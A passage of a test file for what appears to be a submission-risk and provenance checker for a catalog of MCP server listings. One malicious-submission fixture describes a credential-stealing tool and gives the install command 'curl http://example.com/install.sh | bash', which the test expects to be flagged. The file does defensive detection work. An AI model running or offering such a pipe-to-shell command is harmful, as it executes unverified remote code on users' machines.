Review payloads before posting tweets, replies, DMs, or profile updates.`,
        },
        {
          filename: "README.md",
          status: "modified",
          content: "# HeyClaude\n\nGenerated catalog update.",
        },
      ],
    });

    const markdown = formatSubmissionRiskMarkdown(report);

    expect(report.provenanceStatus).toBe("passed");
    expect(report.effectiveContributor?.login).toBe("kriptoburak");
    expect(report.pullRequestActor?.login).toBe("JSONbored");
    expect(report.contributorSource).toBe("content_frontmatter");
    expect(report.trustSignals).toEqual(
      expect.arrayContaining([
        "Contributor analyzed: @kriptoburak",
        "PR opened by: @JSONbored",
      ]),
    );
    expect(report.classificationWarnings).not.toEqual(
      expect.arrayContaining([
        expect.objectContaining({ id: "generated_readme_change" }),
      ]),
    );
    expect(markdown).toContain("Contributor analyzed: @kriptoburak");
    expect(markdown).toContain("PR opened by: @JSONbored");
    expect(markdown).toContain(
      "content/mcp/xquik-mcp-server.mdx: by @kriptoburak via PR #326",
    );
  });

  it("fails automation import provenance when content submitter does not match the issue author", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "automation_import",
      pullRequest: {
        number: 338,
        title: "feat(content): add mcp example",
        html_url: "https://github.com/JSONbored/claudepro-directory/pull/338",
        user: { login: "github-actions[bot]" },
      },
      pullRequestActor: { login: "github-actions[bot]" },
      submissionIssueContributors: [
        {
          issueNumber: 324,
          issue: { number: 324, user: { login: "vy35" } },
          contributor: { login: "vy35", html_url: "https://github.com/vy35" },
        },
      ],
      files: [
        {
          filename: "content/mcp/example-import.mdx",
          status: "added",
          content: `---
title: Example Import
slug: example-import
category: mcp
description: Example imported MCP server.
submittedBy: someone-else
submittedByUrl: https://github.com/someone-else
submissionIssueNumber: 324
submissionIssueUrl: https://github.com/JSONbored/claudepro-directory/issues/324
documentationUrl: https://example.com/docs
installCommand: "npx -y example-import"
usageSnippet: "claude mcp add example-import -- npx -y example-import"
---
## Usage
Run the install command.`,
        },
      ],
    });

    expect(report.provenanceStatus).toBe("failed");
    expect(report.provenanceFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          id: "import_submitter_mismatch_content/mcp/example-import.mdx",
          blocking: true,
        }),
      ]),
    );
  });

  it("fails external direct content PRs without submitter provenance", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "external_direct",
      pullRequest: {
        number: 330,
        title: "Add Example MCP listing",
        html_url: "https://github.com/JSONbored/claudepro-directory/pull/330",
        user: { login: "contributor" },
      },
      files: [
        {
          filename: "content/mcp/no-provenance.mdx",
          status: "added",
          content: `---
title: No Provenance MCP
slug: no-provenance
category: mcp
description: Example MCP server without submitter provenance.
documentationUrl: https://example.com/docs
installCommand: "npx -y no-provenance"
usageSnippet: "claude mcp add no-provenance -- npx -y no-provenance"
---
## Usage
Run the install command.`,
        },
      ],
    });

    expect(report.provenanceStatus).toBe("failed");
    expect(report.provenanceFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          id: "missing_direct_pr_submitter_content/mcp/no-provenance.mdx",
          blocking: true,
        }),
      ]),
    );
  });

  it("fails external direct content PRs when submittedBy differs from the PR author", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "external_direct",
      pullRequest: {
        number: 331,
        title: "Add Example MCP listing",
        html_url: "https://github.com/JSONbored/claudepro-directory/pull/331",
        user: { login: "contributor" },
      },
      files: [
        {
          filename: "content/mcp/wrong-provenance.mdx",
          status: "added",
          content: `---
title: Wrong Provenance MCP
slug: wrong-provenance
category: mcp
description: Example MCP server with mismatched submitter provenance.
submittedBy: someone-else
submittedByUrl: https://github.com/someone-else
documentationUrl: https://example.com/docs
installCommand: "npx -y wrong-provenance"
usageSnippet: "claude mcp add wrong-provenance -- npx -y wrong-provenance"
---
## Usage
Run the install command.`,
        },
      ],
    });

    expect(report.provenanceStatus).toBe("failed");
    expect(report.provenanceFindings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          id: "direct_pr_submitter_mismatch_content/mcp/wrong-provenance.mdx",
          blocking: true,
        }),
      ]),
    );
  });

  it("collects source URLs without regex backtracking on punctuation-heavy text", () => {
    const report = analyzeDirectContentRisk({
      files: [
        {
          filename: "content/mcp/punctuation-heavy-source.mdx",
          status: "added",
          content: `---
title: Punctuation Heavy Source
slug: punctuation-heavy-source
category: mcp
description: Test entry with an inline source URL.
---
Review the canonical docs at https://example.com/docs${",".repeat(20_000)}
and keep scanning bounded.`,
        },
      ],
    });

    expect(report.sourceUrls).toContain("https://example.com/docs");
    expect(report.sourceUrls).not.toContain(
      `https://example.com/docs${",".repeat(20_000)}`,
    );
  });

  it("blocks obviously unsafe submissions without treating category or legal domain as risk", () => {
    const legalIssue = issue(`### Name
Legal Research Helper

### Slug
legal-research-helper

### Category
mcp

### Docs URL
https://example.com/legal

### Description
Legal research helper for public court records.

### Card description
Public legal research helper.`);
    const legalReport = analyzeIssueSubmissionRisk(
      legalIssue,
      validateSubmission(legalIssue),
    );
    expect(legalReport.reviewFlags.map((flag) => flag.id)).not.toContain(
      "regulated_domain",
    );

    const malwareIssue = issue(`### Name
Credential Dumper

### Slug
credential-dumper

### Category
mcp

### Docs URL
https://example.com/mcp

### Description
This tool can dump browser session tokens and steal wallet credentials.

### Card description
Credential extraction workflow.

### Install command
curl http://example.com/install.sh | bash`);
    const malwareReport = analyzeIssueSubmissionRisk(
      malwareIssue,
      validateSubmission(malwareIssue),
    );

    expect(malwareReport.riskTier).toBe("critical");
    expect(malwareReport.reviewFlags.map((flag) => flag.id)).toEqual(
      expect.arrayContaining([
        "malicious_data_theft_capability",
        "non_https_executable_source",
        "unsafe_install_pipeline",
      ]),
    );
  });

  it("parses unstructured issue bodies into canonical fields", () => {
    const fields = parseIssueFormBody(`## Submission

**Name:** Macuse
**Website:** https://macuse.app
**GitHub:** https://github.com/macuseapp/macuse
**Category:** macOS Automation / MCP Server

### Description
Native macOS MCP server.`);
    expect(fields.name).toBe("Macuse");
    expect(fields.category).toBe("mcp");
    expect(fields.github_url).toBe("https://github.com/macuseapp/macuse");
    expect(fields.docs_url).toBe("https://macuse.app");
  });
});
